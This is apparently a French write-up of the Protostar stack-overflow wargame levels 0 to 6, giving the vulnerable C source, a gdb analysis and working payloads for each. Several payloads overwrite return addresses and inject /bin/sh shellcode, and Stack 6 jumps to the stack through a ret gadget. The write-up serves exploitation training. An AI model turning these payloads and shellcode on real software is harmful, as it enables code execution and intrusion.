# Stack 0 #

```c

#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>

int main(int argc, char **argv)
{
  volatile int modified;
  char buffer[64];

  modified = 0;
  gets(buffer);

  if(modified != 0) {
      printf("you have changed the 'modified' variable\n");
  } else {
      printf("Try again?\n");
  }
}

```

Parceque la variable modified est placée avant dans la pile, le débordement du buffer écrase celle ci.

```
python -c 'print "a" * 66 ' | ./stack0
you have changed the 'modified' variable
```

# Stack 1 #

```c
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

int main(int argc, char **argv)
{
  volatile int modified;
  char buffer[64];

  if(argc == 1) {
      errx(1, "please specify an argument\n");
  }

  modified = 0;
  strcpy(buffer, argv[1]);

  if(modified == 0x61626364) {
      printf("you have correctly got the variable to the right value\n");
  } else {
      printf("Try again, you got 0x%08x\n", modified);
  }
}
```

```
./stack1 `python -c 'print "a"*64 + "abcd"[::-1]'`
you have correctly got the variable to the right value
```

# Stack 2 #

```c
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

int main(int argc, char **argv)
{
  volatile int modified;
  char buffer[64];
  char *variable;

  variable = getenv("GREENIE");

  if(variable == NULL) {
      errx(1, "please set the GREENIE environment variable\n");
  }

  modified = 0;

  strcpy(buffer, variable);

  if(modified == 0x0d0a0d0a) {
      printf("you have correctly modified the variable\n");
  } else {
      printf("Try again, you got 0x%08x\n", modified);
  }

}
```

```
export GREENIE=`python -c 'print "a"*64 + "\x0d\x0a\x0d\x0a"[::-1]'`
./stack2
you have correctly modified the variable
```

# Stack 3 #

```c

#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

void win()
{
  printf("code flow successfully changed\n");
}

int main(int argc, char **argv)
{
  volatile int (*fp)();
  char buffer[64];

  fp = 0;

  gets(buffer);

  if(fp) {
      printf("calling function pointer, jumping to 0x%08x\n", fp);
      fp();
  }
}

```
```
nm ./stack3
08048424 T win

(python -c 'print "a"*64 + "\x08\x04\x84\x24"[::-1]'; cat -) | ./stack3
calling function pointer, jumping to 0x08048424
code flow successfully changed
```

# Stack 4 #

```c

#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

void win()
{
  printf("code flow successfully changed\n");
}

int main(int argc, char **argv)
{
  char buffer[64];

  gets(buffer);
}
```

```
0x08048408 <main+0>:	push   %ebp
0x08048409 <main+1>:	mov    %esp,%ebp
0x0804840b <main+3>:	and    $0xfffffff0,%esp
0x0804840e <main+6>:	sub    $0x50,%esp
0x08048411 <main+9>:	lea    0x10(%esp),%eax
0x08048415 <main+13>:	mov    %eax,(%esp)
0x08048418 <main+16>:	call   0x804830c <gets@plt>
0x0804841d <main+21>:	leave
0x0804841e <main+22>:	ret
```

0x50 = 80 soit la taille allouée pour atteindre ebp.
```
(python -c 'print "a"*76 + "\x08\x04\x83\xf4"[::-1]') | ./stack4
code flow successfully changed
```

# Stack 5 #

Il s'agit toujours du même principe, contrôler EIP, lancer un shellcode :)

http://shell-storm.org/shellcode/files/shellcode-827.php

```c
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

int main(int argc, char **argv)
{
  char buffer[64];

  gets(buffer);
}
```

En regardant la mémoire : x/20wx $esp, nous voyons :
```
0xbffff7bc:	0xbffff7c4(EIP)	0x90909090	0x90909090	0x90909090 (les Nop * 20)
0xbffff7cc:	0x90909090	0x90909090	0x6850c031(debut du shellcode)	0x68732f2f
```

```
$ (python -c 'print "\x90"*76 + "\xbf\xff\xf7\xc0"[::-1] + "\x90"*20 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"') > /tmp/file
$ ./stack5 < /tmp/file
$ (cat /tmp/file; cat -) | ./stack5
ls
final0	final1	final2	format0  format1  format2  format3  format4  heap0  heap1  heap2  heap3  net0  net1  net2  net3  net4  stack0  stack1  stack2  stack3  stack4  stack5  stack6  stack7
```

# Stack 6 #

```c

#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

void getpath()
{
  char buffer[64];
  unsigned int ret;

  printf("input path please: "); fflush(stdout);

  gets(buffer);

  ret = __builtin_return_address(0);

  if((ret & 0xbf000000) == 0xbf000000) {
      printf("bzzzt (%p)\n", ret);
      _exit(1);
  }

  printf("got path %s\n", buffer);
}

int main(int argc, char **argv)
{
  getpath();



}

```

Première étape: chercher comment contrôler EIP.

Première méthode (A l'ancienne), il s'agit d'y aller à tâtons:

```python
python -c 'print "a" * 100' > /tmp/file
gdb-peda$ r </tmp/file
0x61616161 in ?? ()

Nous savons que 100 caractères suffisent, maintenant reste à savoir exactement combien.

aaaaaaaaaabbbbbbbbbbccccccccccddddddddddeeeeeeeeeeffffffffffgggggggggghhhhhhhhhhiiiiiiiiiijjjjjjjjjj
0x69696969 in ?? ()

Après quelques essais :

python -c 'print "a"*80 + "BBBB"'  > /tmp/file
0x42424242 in ?? ()
```

Seconde méthode :

Utilisez l'outil pattern_create.rb qui permet de créer un pattern et une fois l'erreur provoquée, de trouver à quel endroit cela s'est produit.

```bash

root@kali:~# /usr/share/metasploit-framework/tools/exploit/pattern_create.rb 200
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag
root@kali:~# echo "200Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag" > /tmp/file

```

```bash
r </tmp/file
Starting program: /root/stack6 </tmp/file
input path please: got path 200Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9A5Ac61Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag

Program received signal SIGSEGV, Segmentation fault.

 [----------------------------------registers-----------------------------------]
EAX: 0xd5
EBX: 0x0
ECX: 0x7fffff2b
EDX: 0xf76f8870 --> 0x0
ESI: 0x1
EDI: 0xf76f7000 --> 0x1b2db0
EBP: 0x63413463 ('c4Ac')
ESP: 0xffe9f090 ("Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag")
EIP: 0x36634135 ('5Ac6')
EFLAGS: 0x10282 (carry parity adjust zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
Invalid $PC address: 0x36634135
[------------------------------------stack-------------------------------------]
0000| 0xffe9f090 ("Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag")
0004| 0xffe9f094 ("c8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag")
0008| 0xffe9f098 ("9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag")
0012| 0xffe9f09c ("Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag")
0016| 0xffe9f0a0 ("d2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag")
0020| 0xffe9f0a4 ("3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag")
0024| 0xffe9f0a8 ("Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag")
0028| 0xffe9f0ac ("d6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag")
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x36634135 in ?? ()
```

Une fois l'erreur provoquée, nous recherchons à quel endroit.

```bash
/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb 36634135
[*] Exact match at offset 77
```

Nous avons donc deux valeurs et je pencherai pour 80 car 77 n'est pas logique (nombre impaire).

Dans l'enoncé il est précisé de passer par un re2libc ou bien un rop car il n'est pas possible d'accéder à la pile. (ligne 17)

Je vais tester via un ROP car c'est un domaine qui m'est inconnu, du moins dans la pratique.

## Récuperer les gadgets ##

Je reste perplexe sur certains résulats lors de mes recherches :

ROPgadget me sort 66 gadgets,
dumprop lui 83 gadgets.

Prenons par exemple l'instruction "ret" :

```
Documents/ROPgadget-master/ROPgadget.py --binary ./stack6 --only "ret"
Gadgets information
============================================================
0x0804833e : ret
```

```
objdump -D ./stack6 | grep "ret"       |  
 804835f:	c3                   	ret
 8048454:	c3                   	ret    
 8048482:	c3                   	ret    
 80484f9:	c3                   	ret    
 8048508:	c3                   	ret    
 8048514:	c3                   	ret    
 8048579:	c3                   	ret    
 804857d:	c3                   	ret    
 80485a9:	c3                   	ret    
 80485c7:	c3                   	ret    
```

dumprop me propose un seul à l'adresse : 0x80484f9.

Sans forcement avoir tous les éléments de réponse, je ferai confiance à dumprop car sa réponse fait partie des ret trouvés dans le binaire. Je suis étonné des résulats de ROPgadget, probalement un mauvaise compréhension de ma part.

Du coup c'est quoi la suite ?

L'instruction ret est l'équivalent de pop eip / jmp esp.

```
|     |       |     |         |                 |
|     |       |     |         |                 |
| EIP |-----> | @RET| ------> | @ du shellcode  |
|     |       |     |         | soit ESP        |
```

Nous écrasons EIP par l'adresse de l'instruction RET. Elle va prendre la prochaine instruction dans la pile
et sauter dessus. La prochaine instruction est l'adresse d'ESP, là ou débute le shellcode.

Contrôle EIP + @RET + @SHELLCODE(ESP) + SHELLCODE

L'adresse de ret est obtenue via dumprop.
L'adresse du shellcode est obtenue en observant ESP lors du contrôle d'EIP.

```
0x41414141 in ?? ()
gdb-peda$ x/x $esp
0xffe051f4:	0x6850c031
```

```
python -c 'print "A"*80 + "\x08\x04\x84\xf9"[::-1] + "\xff\xe0\x51\xf4"[::-1] + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"' > /tmp/file

./stack6 < /tmp/file
```

# Stack 7#

bientôt ...
